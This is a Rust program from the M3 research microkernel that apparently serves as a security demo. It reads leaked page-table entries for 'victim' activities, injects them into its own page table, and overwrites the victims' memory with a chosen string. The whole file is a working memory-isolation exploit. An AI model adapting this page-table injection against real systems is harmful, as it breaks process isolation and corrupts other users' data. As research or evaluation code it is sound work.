/*
 * Copyright (C) 2023 Nils Asmussen, Barkhausen Institut
 *
 * This file is part of M3 (Microkernel-based SysteM for Heterogeneous Manycores).
 *
 * M3 is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation.
 *
 * M3 is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License version 2 for more details.
 */

#![no_std]

use core::mem::size_of;
use core::ptr::write_volatile;

use m3::client::MapFlags;
use m3::env;
use m3::errors::Error;
use m3::kif::Perm;
use m3::mem::VirtAddr;
use m3::println;
use m3::tiles::Activity;
use m3::{cfg, tmif};

#[no_mangle]
pub fn main() -> Result<(), Error> {
    let word = if let Some(arg) = env::args().nth(1) {
        arg
    }
    else {
        "HACKED!"
    };

    let virt = VirtAddr::from(0x3000_0000);
    Activity::own()
        .pager()
        .unwrap()
        .map_anon(virt, cfg::PAGE_SIZE * 8, Perm::RW, MapFlags::PRIVATE)
        .expect("Unable to map anon memory");

    // fault pages in to create higher level PTEs
    unsafe { *virt.as_mut_ptr() = 42 };

    tmif::act_info(virt, virt).unwrap();

    unsafe {
        let count = *virt.as_ptr::<u64>().offset(0) as isize;
        let page_table = VirtAddr::from(*virt.as_ptr::<u64>().offset(1) as usize);

        assert!(count <= 4);
        println!(
            "!! attacker found {} victims, using page_table {}",
            count, page_table
        );

        // start with fourth page, because the pager faults in 4 pages at once
        let start_page = 4;

        for i in 0..count {
            let pte = *virt.as_ptr::<u64>().offset(2 + i);
            println!(
                "!! attacker: getting access to victim {} (pte={:#x})",
                i, pte
            );

            let pte_addr =
                VirtAddr::from(page_table + (start_page + i) as usize * size_of::<u64>());
            // insert PTE to access victim page
            write_volatile(pte_addr.as_mut_ptr(), pte);

            println!("!! attacker: overwriting with {} in victim {}", word, i);

            // overwrite beginning of victim page
            let page_addr = virt + (start_page + i) as usize * cfg::PAGE_SIZE;
            core::ptr::copy_nonoverlapping(word.as_ptr(), page_addr.as_mut_ptr(), word.len());
            println!("!! attacker: done with victim {}!", i);
        }
    }

    Ok(())
}
